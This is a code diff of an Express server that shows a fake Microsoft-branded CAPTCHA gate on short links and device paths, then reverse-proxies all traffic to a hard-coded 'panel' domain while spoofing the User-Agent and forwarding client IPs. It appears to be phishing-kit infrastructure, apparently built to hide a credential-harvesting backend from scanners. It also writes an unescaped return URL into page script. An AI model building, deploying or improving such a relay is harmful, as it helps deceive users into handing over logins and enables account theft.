@@ -5,24 +5,18 @@ const port = process.env.PORT || 3000;
 
 // ⚠️ CHANGE THESE TO YOUR VALUES
 const PANEL_DOMAIN = 'portal42-343.sbs';
-const RENDER_URL = 'https://shared-documents.onrender.com';
-const TURNSTILE_SITEKEY = '0x4AAAAAAD1A5eW6o0hhUZQm'; // Your site key (only this, no secret)
+const TURNSTILE_SITEKEY = '0x4AAAAAAAAEs9a3e6xuicWrZa';
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 app.use(cookieParser());
 
-// Middleware: always show CAPTCHA (no cookie check)
-function requireCaptcha(req, res, next) {
-    // Optionally check a simple cookie (without verification)
-    // If you want to skip after solving, you can set a cookie here and check it.
-    // For simplicity, we'll show it every time.
-    res.redirect(`/captcha?return=${encodeURIComponent(req.originalUrl)}`);
-}
-
-// CAPTCHA page – no "Continue" button, redirects immediately after solving
+// CAPTCHA page
 app.get('/captcha', (req, res) => {
     const returnUrl = req.query.return || '/';
+    // Ensure the return URL is valid
+    const cleanReturn = returnUrl.startsWith('/') ? returnUrl : '/' + returnUrl;
+    
     res.send(`
 <!DOCTYPE html>
 <html lang="en">
@@ -112,7 +106,7 @@ app.get('/captcha', (req, res) => {
     <div class="footer">Secure Connection &bull; Microsoft &bull; Terms &bull; Privacy</div>
   </div>
   <script>
-    const returnUrl = "${returnUrl}";
+    const returnUrl = "${cleanReturn}";
     const messages = ["Loading...", "Processing request...", "Almost there...", "Finalizing..."];
     let index = 0;
     function cycleMessages() {
@@ -124,13 +118,15 @@ app.get('/captcha', (req, res) => {
 
     function turnstileCallback(token) {
       if (token) {
-        // Redirect immediately to the original URL (no verification, no "Continue" page)
+        // Immediately redirect to the actual content
         window.location.href = returnUrl;
       }
     }
 
     function turnstileErrorCallback() {
-      setTimeout(() => { window.location.reload(); }, 1000);
+      document.getElementById("status").textContent = "Verification error. Please refresh.";
+      document.getElementById("status").style.display = "block";
+      setTimeout(() => { window.location.reload(); }, 2000);
     }
 
     function turnstileExpiredCallback() {
@@ -152,20 +148,28 @@ app.get('/captcha', (req, res) => {
     `);
 });
 
-// Protect all short links with CAPTCHA
-app.use('/l/*', requireCaptcha);
-app.use('/device/*', requireCaptcha);
+// Middleware: redirect to CAPTCHA with the original URL
+app.use('/l/*', (req, res, next) => {
+    // Store the original URL and redirect to CAPTCHA
+    const originalUrl = req.originalUrl;
+    res.redirect(`/captcha?return=${encodeURIComponent(originalUrl)}`);
+});
 
-// Main proxy – fetches content from your panel and forwards it to the user
+app.use('/device/*', (req, res, next) => {
+    const originalUrl = req.originalUrl;
+    res.redirect(`/captcha?return=${encodeURIComponent(originalUrl)}`);
+});
+
+// The main proxy
 app.use('*', async (req, res) => {
     try {
         const targetUrl = new URL(req.originalUrl, `https://${PANEL_DOMAIN}`);
-
+        
         const headers = new Headers(req.headers);
         headers.set('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
         headers.delete('host');
 
-        // Forward the real client IP to help with Cloudflare
+        // Forward real client IP
         const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
         if (clientIp) {
             headers.set('X-Forwarded-For', clientIp);
